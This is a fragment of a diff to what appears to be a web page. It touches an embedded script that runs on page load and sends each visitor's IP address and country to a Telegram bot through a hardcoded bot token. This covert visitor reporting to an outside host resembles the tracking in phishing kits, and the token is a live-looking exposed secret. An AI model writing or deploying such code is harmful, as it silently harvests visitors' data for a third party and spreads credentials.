@@ -347,6 +347,7 @@ ${message}
 
 
 
+
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const botToken = "8331599745:AAEc2S3CutUhVlgZnzEtapBEBbVM5Fjm0-4";
@@ -446,4 +447,4 @@ document.addEventListener('DOMContentLoaded', function() {
             await sendToTelegram(`🎌 New Visitor 🎌\n📡 IP: ${ip}\n⚠️ Country detection failed`);
         });
 });
-</script
+</script>
